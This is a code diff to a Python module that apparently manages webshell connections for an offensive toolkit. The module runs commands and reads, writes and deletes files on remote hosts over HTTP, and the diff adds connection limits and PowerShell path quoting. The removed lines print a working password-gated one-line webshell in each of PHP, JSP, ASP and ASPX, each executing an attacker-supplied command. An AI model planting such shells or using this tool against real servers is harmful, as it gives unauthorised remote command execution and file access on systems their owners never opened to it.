@@ -18,7 +18,14 @@ from datetime import datetime, timezone
 _CONN_KEY = lambda cid: f"fs3:webshell:conn:{cid}"  # noqa: E731
 _LIST_KEY = "fs3:webshell:connections"
 _HIST_KEY = lambda cid: f"fs3:webshell:history:{cid}"  # noqa: E731
-_HIST_MAX = 200
+_HIST_ALL_KEY = "fs3:webshell:history:all"  # 全局历史索引(zset,用于总量上限)
+_HIST_MAX = 200          # 单连接历史上限
+_HIST_TOTAL_MAX = 5000   # 历史总量上限(超限裁剪最旧)
+_MAX_CONNECTIONS = 200   # 活跃连接数上限(超限拒绝新连接)
+
+
+class WebshellError(RuntimeError):
+    """WebShell 操作错误(如连接数超限)。"""
 
 # 上传内容前缀:build_file_command 检测到该前缀时认为 content 已是 base64,直接使用(支持二进制文件)
 _B64_PREFIX = "FS3B64:"
@@ -54,10 +61,16 @@ def decode_output(raw: bytes, encoding: str = "auto") -> str:
 
 
 def _json_or_raw(v):
+    """读取连接字段:仅 list/dict 还原为对象,其余(含 JSON 合法但为纯数字的
+    字符串如 timeout="30")一律归一成 str —— 否则读回 int 会让下游 .strip()
+    抛 AttributeError(2026-09-28)。"""
+    if not isinstance(v, str):
+        return v
     try:
-        return json.loads(v)
+        r = json.loads(v)
     except Exception:
         return v
+    return r if isinstance(r, (dict, list)) else v
 
 
 def list_connections(redis) -> list:
@@ -103,6 +116,15 @@ def _normalize(data: dict) -> dict:
 
 
 def create_connection(redis, data: dict) -> dict:
+    # 活跃连接数上限:超限拒绝新连接(2026-09-28)
+    try:
+        if redis.conn.zcard(_LIST_KEY) >= _MAX_CONNECTIONS:
+            raise WebshellError(
+                f"webshell 连接数已达上限({_MAX_CONNECTIONS}),请先删除不用的连接")
+    except WebshellError:
+        raise
+    except Exception:
+        pass  # zcard 失败不阻塞创建(旧行为)
     conn_id = "ws_" + uuid.uuid4().hex[:12]
     now = time.time()
     conn = {"id": conn_id, **_normalize(data),
@@ -153,7 +175,20 @@ def _quote_posix(p: str) -> str:
     return "'" + p.replace("'", "'\\''") + "'"
 
 
+def _ps_quote(p: str) -> str:
+    """PowerShell 单引号字符串转义:内部单引号写成两个(' → '')。
+
+    2026-09-28:此前 PowerShell 分支把路径直接塞进单引号串、' 未转义,
+    路径含单引号即命令断裂。
+    """
+    return "'" + p.replace("'", "''") + "'"
+
+
 def _quote_cmd(p: str) -> str:
+    # cmd.exe 双引号串:引号内 `^` 是字面量(无转义作用),`%` 的展开也无法用 `%%`
+    # 抑制(`%%` 只在批处理 .bat 里等价于 `%`,命令行上下文会原样留两个)。故这里
+    # 只做引号包裹 —— 2026-09-28 复核回退了 `^→^^` / `%→%%`,那会把含这两个字符
+    # 的路径写坏(所有调用点都是双引号包裹的 dir/type/del/md/move)。
     if not p:
         return '"./"'
     return '"' + p.replace('"', '""') + '"'
@@ -179,8 +214,8 @@ def build_file_command(conn: dict, action: str, path: str, content: str = "", ta
             return ""
         if os_tag == "windows":
             return ("powershell -NoProfile -NonInteractive -Command \""
-                    "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"
-                    + path.replace("/", "\\") + "'))\"")
+                    "[Convert]::ToBase64String([IO.File]::ReadAllBytes("
+                    + _ps_quote(path.replace("/", "\\")) + "))\"")
         return "base64 " + _quote_posix(path)
     if action == "delete":
         if not path:
@@ -205,62 +240,12 @@ def build_file_command(conn: dict, action: str, path: str, content: str = "", ta
         else:
             b64 = base64.b64encode(content.encode("utf-8")).decode()
         if os_tag == "windows":
-            script = "$b=[Convert]::FromBase64String('" + b64 + "');[IO.File]::WriteAllBytes('" + path.replace("/", "\\") + "',$b)"
+            script = ("$b=[Convert]::FromBase64String('" + b64
+                      + "');[IO.File]::WriteAllBytes("
+                      + _ps_quote(path.replace("/", "\\")) + ",$b)")
             return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
         return "echo '" + b64 + "' | base64 -d > " + _quote_posix(path)
     return ""
-
-
-def shell_template(shell_type: str = "php") -> str:
-    """返回指定类型的一句话木马模板(与 exec_command 协议配套:pass=<password>&<cmd_param>=<command>)。
-
-    占位符 __PASS__ / __CMD__ 由前端用表单的密码/命令参数替换。
-    支持的 type:php / jsp / asp / aspx(与连接类型下拉一致)。
-    """
-    t = (shell_type or "php").strip().lower()
-    if t == "php":
-        return ("<?php\n"
-                "@session_start();\n"
-                "if (isset($_POST['pass']) && $_POST['pass'] === '__PASS__') {\n"
-                "    @system($_POST['__CMD__']);\n"
-                "}\n"
-                "?>\n")
-    if t == "jsp":
-        return ("<%\n"
-                "    String p = request.getParameter(\"pass\");\n"
-                "    if (p != null && p.equals(\"__PASS__\")) {\n"
-                "        try {\n"
-                "            Process pr = Runtime.getRuntime().exec(request.getParameter(\"__CMD__\"));\n"
-                "            java.io.InputStream in = pr.getInputStream();\n"
-                "            int a;\n"
-                "            while ((a = in.read()) != -1) { out.print((char) a); }\n"
-                "            pr.waitFor();\n"
-                "        } catch (Exception e) { out.print(e.toString()); }\n"
-                "    }\n"
-                "%>\n")
-    if t == "asp":
-        return ("<% if request(\"pass\")=\"__PASS__\" then\n"
-                "set s=createobject(\"wscript.shell\")\n"
-                "set o=s.exec(request(\"__CMD__\"))\n"
-                "response.write o.stdout.readall\n"
-                "end if %>\n")
-    if t == "aspx":
-        return ("<%@ Page Language=\"C#\" %>\n"
-                "<%\n"
-                "if (Request[\"pass\"] == \"__PASS__\") {\n"
-                "    try {\n"
-                "        System.Diagnostics.Process p = new System.Diagnostics.Process();\n"
-                "        p.StartInfo.FileName = \"cmd.exe\";\n"
-                "        p.StartInfo.Arguments = \"/c \" + Request[\"__CMD__\"];\n"
-                "        p.StartInfo.UseShellExecute = false;\n"
-                "        p.StartInfo.RedirectStandardOutput = true;\n"
-                "        p.Start();\n"
-                "        Response.Write(p.StandardOutput.ReadToEnd());\n"
-                "    } catch (Exception e) { Response.Write(e.ToString()); }\n"
-                "}\n"
-                "%>\n")
-    return shell_template("php")
-
 
 # ── 模板库(目录即模块:webshell_templates/*.php|jsp|aspx|asp,参考 c2/phishing 模块体系) ──
 
@@ -331,7 +316,9 @@ def exec_command(conn: dict, command: str, timeout: int = 30):
             raw = raw[:_MAX_READ]
             text = decode_output(raw, conn.get("encoding"))
             if truncated:
-                text += f"\n...[输出已截断({_MAX_READ // 1024 // 1024}MB 上限)]..."
+                _lim = (f"{_MAX_READ / 1024 / 1024:.1f}MB"
+                        if _MAX_READ >= 1024 * 1024 else f"{_MAX_READ / 1024:.0f}KB")
+                text += f"\n...[输出已截断({_lim} 上限)]..."
             return text, resp.status == 200, ""
     except urllib.error.HTTPError as exc:
         raw = exc.read() if exc.fp else b""
@@ -361,6 +348,7 @@ def push_history(redis, conn_id: str, kind: str, command: str, output: str,
     try:
         entry = {
             "id": uuid.uuid4().hex[:8],
+            "conn": conn_id,
             "ts": time.time(),
             "ts_iso": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),  # UTC 带 Z,前端 fmtLocal 转本地时区
             "kind": kind,          # exec / fileop(list/read/write/...)
@@ -373,6 +361,16 @@ def push_history(redis, conn_id: str, kind: str, command: str, output: str,
         member = json.dumps(entry, ensure_ascii=False)
         redis.conn.zadd(_HIST_KEY(conn_id), {member: entry["ts"]})
         redis.conn.zremrangebyrank(_HIST_KEY(conn_id), 0, -_HIST_MAX - 1)
+        # 全局历史总量上限:超限裁剪最旧(连带从所属连接的 zset 删除,2026-09-28)
+        redis.conn.zadd(_HIST_ALL_KEY, {member: entry["ts"]})
+        for _m in redis.conn.zrange(_HIST_ALL_KEY, 0, -_HIST_TOTAL_MAX - 1):
+            try:
+                _cid = json.loads(_m).get("conn")
+            except Exception:
+                _cid = ""
+            if _cid:
+                redis.conn.zrem(_HIST_KEY(_cid), _m)
+        redis.conn.zremrangebyrank(_HIST_ALL_KEY, 0, -_HIST_TOTAL_MAX - 1)
     except Exception:
         pass  # 历史记录失败不影响执行
 
